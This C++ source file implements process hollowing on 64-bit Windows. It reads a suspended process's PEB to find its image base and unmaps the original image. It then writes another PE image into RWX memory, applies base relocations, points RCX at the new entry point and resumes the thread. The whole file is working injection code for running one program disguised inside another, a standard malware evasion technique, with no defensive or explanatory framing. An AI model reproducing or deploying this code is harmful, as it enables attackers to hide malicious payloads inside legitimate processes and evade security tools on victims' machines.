#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#include "HollowProcess.hpp"

#pragma comment(lib, "ntdll")


void HollowProcess(PROCESS_INFORMATION* ppi, LPVOID actualProcessContent) {
	HANDLE hProcess = ppi->hProcess;
	HANDLE hThread = ppi->hThread;
	
	PROCESS_BASIC_INFORMATION pbi;
	DWORD tmpsize;
	::NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &tmpsize);

	DWORD64 pImageBase = (DWORD64)pbi.PebBaseAddress + 0x10; // Offset 0x10 from debugger

	DWORD64 ImageBase;
	::ReadProcessMemory(hProcess, (LPVOID)pImageBase, &ImageBase, sizeof(DWORD64), 0);

	NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)::GetProcAddress(::GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
	NtUnmapViewOfSection(hProcess, (LPVOID)ImageBase);
	
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)actualProcessContent;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)((DWORD64)actualProcessContent + pDosHdr->e_lfanew);
	DWORD ImageSize = pNTHdr->OptionalHeader.SizeOfImage;
	LPVOID newImageBase = ::VirtualAllocEx(hProcess, (LPVOID)(ImageBase), ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	ImageBase = (DWORD64)newImageBase;
	DWORD64 deltaImageBase = ImageBase - pNTHdr->OptionalHeader.ImageBase;
	//printf("Delta : %p\n", deltaImageBase);
	pNTHdr->OptionalHeader.ImageBase = ImageBase;

	// Map PE content into Remote Process
	DWORD HdrSize = pNTHdr->OptionalHeader.SizeOfHeaders;
	::WriteProcessMemory(hProcess, (LPVOID)ImageBase, actualProcessContent, HdrSize, 0);

	DWORD OptHdrSize = pNTHdr->FileHeader.SizeOfOptionalHeader;
	IMAGE_SECTION_HEADER* pSectionTable = (IMAGE_SECTION_HEADER*)((DWORD64)&(pNTHdr->OptionalHeader) + OptHdrSize);
	DWORD sections = pNTHdr->FileHeader.NumberOfSections;
	for (int i = 0; i < sections; i++) {
		DWORD64 pSrc = (DWORD64)actualProcessContent + pSectionTable[i].PointerToRawData;
		DWORD64 pDst = ImageBase + pSectionTable[i].VirtualAddress;
		tmpsize = pSectionTable[i].SizeOfRawData;
		::WriteProcessMemory(hProcess, (LPVOID)pDst, (LPVOID)pSrc, tmpsize, 0);
	}

	// Fix Base Relocations
	if (deltaImageBase) {
		int i = 0;
		for (i = 0; i < sections; i++) {
			if (!strcmp(".reloc", (CHAR*)pSectionTable[i].Name)) {
				break;
			}
		}

		IMAGE_DATA_DIRECTORY* pRelocationDataDir = &pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		IMAGE_BASE_RELOCATION* pRawRelocationDir = (IMAGE_BASE_RELOCATION*)((DWORD64)actualProcessContent + pSectionTable[i].PointerToRawData);

		DWORD RelocSize = pRelocationDataDir->Size;
		DWORD RelocSizeCompleted = 0;

		while (RelocSizeCompleted < RelocSize) {
			DWORD RelocPageRVA = pRawRelocationDir->VirtualAddress;
			DWORD reloc_count = (pRawRelocationDir->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

			RelocSizeCompleted += sizeof(IMAGE_BASE_RELOCATION);
			WORD* curr_loc = (WORD*)((DWORD64)pRawRelocationDir + sizeof(IMAGE_BASE_RELOCATION));
			for (DWORD i = 0; i < reloc_count; i++) {
				RelocSizeCompleted += sizeof(WORD);
				DWORD offset = *(curr_loc + i);
				WORD offsetType = offset >> 12;

				if (offsetType == 0) { continue; }
				offset = offset & 0x0fff;

				DWORD64 RelocDst = (DWORD64)ImageBase + RelocPageRVA + offset;
				DWORD64 addr;
				::ReadProcessMemory(hProcess, (LPVOID)RelocDst, &addr, sizeof(DWORD64), 0);
				// printf("%p; ", addr);
				addr += deltaImageBase;
				// printf("%p\n", addr);
				::WriteProcessMemory(hProcess, (LPVOID)RelocDst, &addr, sizeof(DWORD64), 0);
			}
			pRawRelocationDir = (IMAGE_BASE_RELOCATION*)((DWORD64)pRawRelocationDir + pRawRelocationDir->SizeOfBlock);
		}
	}

	// Fix Thread parameters and Resume
	DWORD64 newEntryPoint = ImageBase + pNTHdr->OptionalHeader.AddressOfEntryPoint;
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;
	::GetThreadContext(hThread, &ctx);
	/*
	printf("Entry : %p\n", newEntryPoint);
	printf("Rax : %p\n", ctx.Rax);
	printf("Rbx : %p\n", ctx.Rbx);
	printf("Rcx : %p\n", ctx.Rcx);
	printf("Rdx : %p\n", ctx.Rdx);
	getchar();
	*/
	// Rcx needs to be updated with entry point
	// Found from Reversing
	ctx.Rcx = newEntryPoint;
	::SetThreadContext(hThread, &ctx);
	/*
	printf("Rax : %p\n", ctx.Rax);
	printf("Rbx : %p\n", ctx.Rbx);
	printf("Rcx : %p\n", ctx.Rcx);
	printf("Rdx : %p\n", ctx.Rdx);
	getchar();
	*/
	::ResumeThread(hThread);
	
	return;
}